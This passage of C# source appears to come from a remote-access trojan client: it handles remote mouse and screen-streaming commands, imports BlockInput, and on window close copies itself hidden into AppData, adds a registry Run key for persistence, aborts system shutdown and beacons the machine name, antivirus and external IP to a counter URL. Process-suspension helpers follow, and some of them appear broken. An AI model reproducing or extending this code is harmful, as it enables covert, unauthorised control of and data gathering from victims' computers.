                                        Vm.ClickLeftMouseButton(x, y);
                                    }
                                }
                                else if (strSplit[0] == "MiddleDown")
                                {
                                    //Vm.MiddleClick(x, y);
                                }
                                else if (strSplit[0] == "RightDown")
                                {
                                    if (this.remotedNav)
                                    {
                                        Rightclick(WindowHandle, x, y);
                                    }
                                    else
                                    {
                                        //Vm.RightClick(x, y);
                                        Vm.ClickRightMouseButton(x, y);
                                    }
                                }
                                else if (strSplit[0] == "LeftUp")
                                {
                                    //mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP, x, y, 0, 0);
                                }
                                else if (strSplit[0] == "MiddleUp")
                                {
                                    //mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN, x, y, 0, 0);
                                }
                                else if (strSplit[0] == "RightUp")
                                {
                                    //mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTUP, x, y, 0, 0);
                                }
                                else if (strSplit[0] == "Move")
                                {
                                    //Vm.MoveTo(x, y);
                                    //SetCursorPos((int)x, (int)y);  
                                }
                            }
                            else if (message.IndexOf("<|Remote|>") == 0)
                            {
                                if (value.IndexOf("On") == 0)
                                {
                                    if (!this.remoted || this.remoted)
                                    {
                                        if (this.remotedNav)
                                        {
                                            this.remoted = false;
                                            threadNav = new Thread(() => SendNavScreenProc());
                                            threadNav.Start();
                                        }
                                        else
                                        {
                                              this.remoted = true;
                                              thread = new Thread(() => SendScreenProc());
                                              thread.Start();
                                        }
                                    }
                                }
                                else if (value.IndexOf("Off") == 0)
                                {
                                    this.remoted = false;
                                    this.remotedNav = false;
                                }
                            }
                            else if (message.IndexOf("<|Screen|>") == 0)
                            {
                                if (value.IndexOf("Success") == 0)
                                {
                                    this.receivedScreen = 1;
                                }
                                else if (value.IndexOf("Fail") == 0)
                                {
                                    this.receivedScreen = 2;
                                }
                            }
                            else if(message.IndexOf("<|StopScreen|>") == 0)
                            {
                                this.remoted = false;
                            }
                        }

                    }
                }
                else
                {
                    mreSendData.Reset();
                    Byte[] buffer = this.queueSendData.Pop();
                    if (buffer != null)
                    {
                        this.networkStream.Write(buffer, 0, buffer.Length);
                    }
                    mreSendData.Set();
                }
                Thread.Sleep(30);
            }
            this.remoted = false;
            this.remotedNav = false;
            /* }
             catch (IOException e)
             {
                 //Console.WriteLine(e.StackTrace);
                 MessageBox.Show(e.ToString());
                 this.Disconnect();
             }
             catch (Exception e)
             {
                 //Console.WriteLine(e.StackTrace);
                 MessageBox.Show(e.ToString());
             }*/ 
        }

        private void timerAutoConnect_Tick(object sender, EventArgs e)
        {
                button_connect.PerformClick();
        }

        [System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
        [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);

       public void sendWarning()
        {
            string url = "http://localhost/CONTADOR.php?pc=" + System.Environment.MachineName + "&av=" + this.aV + "&gb=" + this.gb + "&ip=" + this.IPExterno;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream resStream = response.GetResponseStream();
   
        }

       [DllImport("advapi32.dll", SetLastError = true)]
       static extern bool AbortSystemShutdown(string lpMachineName);
        
        private void MenuRemoteClient_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {

                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\" + Path.GetFileName(Application.ExecutablePath)) == false)
                {
                    AbortSystemShutdown(System.Environment.MachineName);

                    File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\" + Path.GetFileName(Application.ExecutablePath), true);
                    File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\" + Path.GetFileName(Application.ExecutablePath), FileAttributes.Hidden);
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\" + Path.GetFileName(Application.ExecutablePath));

                    sendWarning();
                }
            }
            catch (Exception excp) { }
        }

        public void Uninstall(string app)
        {
            string keyName = @"Software\Microsoft\Windows\CurrentVersion\Run";
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyName, true))
            {
                if (key == null)
                {
                }
                else
                {
                    Object o = key.GetValue(app);
                    if (o != null)
                    {
                        key.DeleteValue(app);
                    }
                }
            }
        }

        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);


        private static void SuspendProcess(int pid)
        {
            var process = Process.GetProcessById(pid);

            if (process.ProcessName == string.Empty)
                return;

            foreach (ProcessThread pT in process.Threads)
            {
                IntPtr pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);

                if (pOpenThread == IntPtr.Zero)
                {
                    continue;
                }

                SuspendThread(pOpenThread);

                CloseHandle(pOpenThread);
            }
        }

        public static void ResumeProcess(int pid)
        {
            var process = Process.GetProcessById(pid);

            if (process.ProcessName == string.Empty)
                return;

            foreach (ProcessThread pT in process.Threads)
            {
                IntPtr pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);

                if (pOpenThread == IntPtr.Zero)
                {
                    continue;
                }

                var suspendCount = 0;
                do
                {
                    suspendCount = ResumeThread(pOpenThread);
                } while (suspendCount > 0);

                CloseHandle(pOpenThread);
            }
        }

        public static void suspProc(string proc)
        {
            var p = new Process();

            p.StartInfo.FileName = proc;

            int procId = p.Id;
            try
            {
                if (procId != 0)
                    SuspendProcess(procId);
            }
            catch (Exception ex) { }
        }

        public static void resumProc(string proc)
        {
            var p = new Process();

            p.StartInfo.FileName = proc;

            int procId = p.Id;
            try
            {
                if (procId != 0)
                    ResumeProcess(procId);
            }
            catch (Exception ex) { }
        }
    }
}